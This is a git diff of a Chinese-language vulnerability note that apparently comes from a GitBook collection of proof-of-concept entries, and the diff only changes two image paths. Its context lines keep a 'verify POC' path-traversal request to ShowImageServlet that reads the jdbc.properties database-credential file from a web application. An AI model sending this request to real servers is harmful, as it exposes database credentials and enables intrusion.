@@ -18,7 +18,7 @@
 
 登陆页面
 
-![image-20230828145057107](images/image-20230828145057107.png)
+![image-20230828145057107](../.gitbook/assets/image-20230828145057107.png)
 
 验证POC
 
@@ -26,4 +26,4 @@
 /servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print
 ```
 
-![image-20230828145109229](images/image-20230828145109229.png)
+![image-20230828145109229](../.gitbook/assets/image-20230828145109229.png)
